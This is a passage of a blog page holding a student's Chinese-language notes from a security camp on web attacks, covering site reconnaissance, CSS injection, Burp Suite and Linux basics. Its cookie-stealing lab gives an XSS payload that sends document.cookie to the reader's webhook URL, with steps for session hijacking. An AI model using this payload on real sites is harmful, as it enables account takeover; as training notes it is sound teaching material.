+</ul>
+<h2 id="攻擊網站的步驟"><a href="#攻擊網站的步驟" class="headerlink" title="攻擊網站的步驟"></a>攻擊網站的步驟</h2><ol>
+<li>了解網站架構規模</li>
+<li>整理收集可用資料</li>
+<li>針對網站進行攻擊<ul>
+<li>竊取網站資料</li>
+<li>安裝定時炸彈</li>
+</ul>
+</li>
+</ol>
+<h2 id="如何看到一個網站"><a href="#如何看到一個網站" class="headerlink" title="如何看到一個網站"></a>如何看到一個網站</h2><ul>
+<li>瀏覽器<ul>
+<li>只是一個媒介</li>
+</ul>
+</li>
+<li>wget</li>
+<li>curl</li>
+<li>只要有HTTP request 和 response就可以跟網站互動</li>
+<li>輸入網址後發生什麼<ol>
+<li>找到路：路由routing </li>
+<li>目的地 ip address <ul>
+<li>網址經由DNS解析 –&gt; ip address</li>
+</ul>
+</li>
+<li>封包封裝 &#x2F; 解封裝</li>
+</ol>
+</li>
+</ul>
+<blockquote>
+<p>HTTP 是無狀態協定</p>
+</blockquote>
+<ul>
+<li>Cookie<ul>
+<li>簡易的身份驗證</li>
+<li>幫無狀態的HTTP紀錄有狀態的資訊</li>
+</ul>
+</li>
+</ul>
+<h2 id="在前端裡面可以了解什麼"><a href="#在前端裡面可以了解什麼" class="headerlink" title="在前端裡面可以了解什麼"></a>在前端裡面可以了解什麼</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><ul>
+<li>找版本資訊<ul>
+<li>特殊套件、模板</li>
+</ul>
+</li>
+<li>找註解<ul>
+<li>隱藏資料</li>
+</ul>
+</li>
+</ul>
+<h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><ul>
+<li>利用請求，屬性來偷資料<ul>
+<li>css injction</li>
+</ul>
+</li>
+</ul>
+<h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>javascript &#x3D; 程式語言 + DOM + BOM</p>
+<ul>
+<li>DOM<ul>
+<li>你輸入甚麼我輸出什麼</li>
+<li>Document Object Model</li>
+<li>控制網頁相關內容的</li>
+</ul>
+</li>
+<li>BOM<ul>
+<li>JS 操控瀏覽器</li>
+<li>例如彈出視窗</li>
+</ul>
+</li>
+</ul>
+<h3 id="偷Cookie-Lab"><a href="#偷Cookie-Lab" class="headerlink" title="偷Cookie Lab"></a>偷Cookie Lab</h3><p><a target="_blank" rel="noopener" href="http://lab.crazyfirelee.tw/">練習網頁</a><br>換成自己的網址的部分改成你 webhook.site 的網址</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;new Image().src=<span class="string">&quot;換成自己的網址&quot;</span>+<span class="string">&quot;/&quot;</span>+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>把上面那串丟進練習網頁的搜尋框 –&gt; 得到網址</li>
+<li>拿這段網址去釣別人的cookie</li>
+<li>回到webhook拿到cookie (收到的網址後段的PHPSESSID)</li>
+<li>到練習網頁f12&#x2F;storage&#x2F;cookies的地方改PHPSESSID</li>
+</ol>
+<h2 id="Burp-Suite"><a href="#Burp-Suite" class="headerlink" title="Burp Suite"></a>Burp Suite</h2><ul>
+<li>攔截瀏覽器收到的封包</li>
+<li>修改從瀏覽器傳送出的封包<ul>
+<li>完全繞過前端的過濾</li>
+</ul>
+</li>
+<li>紀錄和伺服器互動的全部過程</li>
+</ul>
+<h2 id="Linux-基本操作"><a href="#Linux-基本操作" class="headerlink" title="Linux 基本操作"></a>Linux 基本操作</h2><ul>
+<li>grep<ul>
+<li>有人使用 <code>grep -r AIS3_Junior</code> 偷 Flag</li>
+</ul>
+</li>
+<li>權限<ul>
+<li>在<code>ls -al</code>裡可以看到 rwxrwxrwx，三個 rwx 分別為擁有者&#x2F;群組&#x2F;其他人，r 代表閱讀、w 代表修改、x 代表執行</li>
+</ul>
+</li>
+<li>加密<ul>
+<li>哈希值<ul>
+<li>MD5 (不再安全)</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>記憶指令使用紀錄<ul>
+<li>.zhs_history</li>
+</ul>
+</li>
+</ul>
+</article><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024-AIS3-junior/20240818/2558445555/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="/img/cover.gif" onerror="onerror=null;src='https://i.imgur.com/bU2QlBs.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">AIS3 junior DAY2-網頁安全</div></div></a></div><div class="next-post pull-right"><a href="/2024-AIS3-junior/20241007/3482195068/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="/img/cover.gif" onerror="onerror=null;src='https://i.imgur.com/bU2QlBs.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">AIS3 junior DAY2 網頁安全 writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>相關推薦</span></div><div class="relatedPosts-list"><div><a href="/2024-AIS3-junior/20240818/2511373762/" title="AIS3 junior DAY3-AI 應用安全實務"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="/img/cover.gif" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-18</div><div class="title">AIS3 junior DAY3-AI 應用安全實務</div></div></a></div><div><a href="/2024-AIS3-junior/20240818/2558445555/" title="AIS3 junior DAY2-網頁安全"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="/img/cover.gif" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-18</div><div class="title">AIS3 junior DAY2-網頁安全</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目錄</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9A%E9%BA%BC%E6%98%AF%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8"><span class="toc-number">1.</span> <span class="toc-text">甚麼是資訊安全</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%9A%E9%BA%BC%E6%98%AF%E9%A7%AD%E5%AE%A2"><span class="toc-number">2.</span> <span class="toc-text">甚麼是駭客</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B3%87%E5%AE%89%E4%BA%8B%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">資安事件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%83%8F%E4%BF%84%E6%88%B0%E7%88%AD"><span class="toc-number">3.1.</span> <span class="toc-text">烏俄戰爭</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E8%B2%BB%E7%B7%9A%E4%B8%8A%E7%9C%9F%E4%BA%BA%E7%9B%B4%E6%92%AD"><span class="toc-number">3.2.</span> <span class="toc-text">免費線上真人直播</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%8F%E5%A4%A9%E7%9A%84%E7%B6%B2%E8%B7%AF%E7%94%9F%E6%B4%BB"><span class="toc-number">3.3.</span> <span class="toc-text">每天的網路生活</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E9%BA%BC%E5%88%A9%E7%94%A8%E5%80%8B%E8%B3%87"><span class="toc-number">4.</span> <span class="toc-text">怎麼利用個資</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E6%93%8A%E8%88%87%E4%BF%9D%E8%AD%B7"><span class="toc-number">5.</span> <span class="toc-text">攻擊與保護</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%A3%E9%AD%9A%E7%B6%B2%E7%AB%99"><span class="toc-number">5.1.</span> <span class="toc-text">釣魚網站</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E4%BF%9D%E8%AD%B7%E8%87%AA%E5%B7%B1"><span class="toc-number">5.2.</span> <span class="toc-text">如何保護自己</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%A3%BD%E4%BD%9C%E9%87%A3%E9%AD%9A%E7%B6%B2%E7%AB%99"><span class="toc-number">5.3.</span> <span class="toc-text">如何製作釣魚網站</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8D%E7%B3%BB%E7%B5%B1%E7%9A%84%E6%94%BB%E6%93%8A"><span class="toc-number">6.</span> <span class="toc-text">對系統的攻擊</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bug-v-s-%E6%BC%8F%E6%B4%9E"><span class="toc-number">7.</span> <span class="toc-text">bug v.s. 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E6%93%8A%E7%B6%B2%E7%AB%99%E7%9A%84%E6%AD%A5%E9%A9%9F"><span class="toc-number">8.</span> <span class="toc-text">攻擊網站的步驟</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%9C%8B%E5%88%B0%E4%B8%80%E5%80%8B%E7%B6%B2%E7%AB%99"><span class="toc-number">9.</span> <span class="toc-text">如何看到一個網站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8%E5%89%8D%E7%AB%AF%E8%A3%A1%E9%9D%A2%E5%8F%AF%E4%BB%A5%E4%BA%86%E8%A7%A3%E4%BB%80%E9%BA%BC"><span class="toc-number">10.</span> <span class="toc-text">在前端裡面可以了解什麼</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTML"><span class="toc-number">10.1.</span> <span class="toc-text">HTML</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSS"><span class="toc-number">10.2.</span> <span class="toc-text">CSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript"><span class="toc-number">10.3.</span> <span class="toc-text">JavaScript</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%B7Cookie-Lab"><span class="toc-number">10.4.</span> <span class="toc-text">偷Cookie Lab</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Burp-Suite"><span class="toc-number">11.</span> <span class="toc-text">Burp Suite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="toc-number">12.</span> <span class="toc-text">Linux 基本操作</span></a></li></ol></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="Brianlien" target="_blank">Brianlien</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">30</div></a><a href="/tags/" title="tag"><div class="headline">標籤</div><div class="length-num">8</div></a><a href="/categories/" title="category"><div class="headline">分類</div><div class="length-num">6</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="顯示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>顯示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">網頁</div><div class="back-menu-list"><a class="back-menu-item" href="https://brianlien95.github.io/" title="部落格"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="https://i.imgur.com/ZAMAUkN.jpeg" alt="部落格"/><span class="back-menu-item-text">部落格</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">AI工具</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://askmanyai.cn/index" title="AskmanyAI"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="https://ama-static.floatai.cn/askmanyai/prod/img/logo.f01cc1bc.svg" alt="AskmanyAI"/><span class="back-menu-item-text">AskmanyAI</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://ai-bot.cn/" title="AI工具集"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="https://ai-bot.cn/wp-content/uploads/2024/08/Photoroom-logo.png" alt="AI工具集"/><span class="back-menu-item-text">AI工具集</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://notebooklm.google/" title="NotebookLM"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="https://image.woshipm.com/2024/09/19/9d75db98-7648-11ef-abf0-00163e0b5ff3.jpg" alt="NotebookLM"/><span class="back-menu-item-text">NotebookLM</span></a><a class="back-menu-item" target="_blank" rel="noopener" href="https://kimi.moonshot.cn/" title="Kimi"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;https://i.imgur.com/bU2QlBs.gif&quot;" data-lazy-src="https://gongwenguan.com/wp-content/uploads/2024/06/1717665098-Kimi-LOGO.jpg" alt="Kimi"/><span class="back-menu-item-text">Kimi</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分類</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 標籤</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 關於</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 關於本人</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/English/" style="font-size: 0.88rem;">English<sup>1</sup></a><a href="/tags/writeup/" style="font-size: 0.88rem;">writeup<sup>2</sup></a><a href="/tags/%E5%85%B1%E7%AD%86%E7%AD%86%E8%A8%98/" style="font-size: 0.88rem;">共筆筆記<sup>3</sup></a><a href="/tags/%E5%9C%8B%E6%96%87/" style="font-size: 0.88rem;">國文<sup>1</sup></a><a href="/tags/%E5%AF%86%E7%A2%BC%E5%AD%B8/" style="font-size: 0.88rem;">密碼學<sup>2</sup></a><a href="/tags/%E7%B6%B2%E8%B7%AF%E6%BC%8F%E6%B4%9E/" style="font-size: 0.88rem;">網路漏洞<sup>19</sup></a><a href="/tags/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/" style="font-size: 0.88rem;">逆向工程<sup>1</sup></a><a href="/tags/%E9%87%91%E8%9E%8D/" style="font-size: 0.88rem;">金融<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="閱讀模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="簡繁轉換">簡</button><button id="darkmode" type="button" title="淺色和深色模式轉換"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="單欄和雙欄切換"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="設定"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目錄"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到頂部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜尋</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  資料庫載入中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜尋文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為簡體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.cbd.int/pangu@4.0.7/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
+var HoldLog = console.log;
+console.log = function () {};
+let now1 = new Date();
+queueMicrotask(() => {
+  const Log = function () {
+    HoldLog.apply(console, arguments);
+  }; //在恢复前输出日志
+  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
+  now1.setTime(now1.getTime() + 250);
+  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
+  const dnum = Math.floor(days);
+  const ascll = [
+    `欢迎使用安知鱼!`,
+    `生活明朗, 万物可爱`,
+    `
+        
+       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
+      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
+      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
+      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
+      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
+      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
+        
+        `,
+    "已上线",
+    dnum,
+    "天",
+    "©2020 By 安知鱼 V1.6.12",
+  ];
+  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];
+
+  setTimeout(
+    Log.bind(
+      console,
+      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      "color:#425AEF",
+      "",
+      "color:#425AEF",
+      ""
+    )
+  );
+  setTimeout(
+    Log.bind(
+      console,
+      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
+      "color:white; background-color:#4fd953",
+      "",
+      "",
+      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(
+      console,
+      "%c ⚡ Powered by 安知鱼 %c 你正在访问 Brianlien 的博客.",
+      "color:white; background-color:#f0ad4e",
+      ""
+    )
+  );
+
+  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));
+
+  setTimeout(
+    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
+  );
+});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail = "";
+</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+  // removeEventListener scroll 
+  anzhiyu.removeGlobalFnEvent('pjax')
+  anzhiyu.removeGlobalFnEvent('themeChange')
+
+  document.getElementById('rightside').classList.remove('rightside-show')
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+})
+
+document.addEventListener('pjax:error', e => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404')
+  }
+})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>
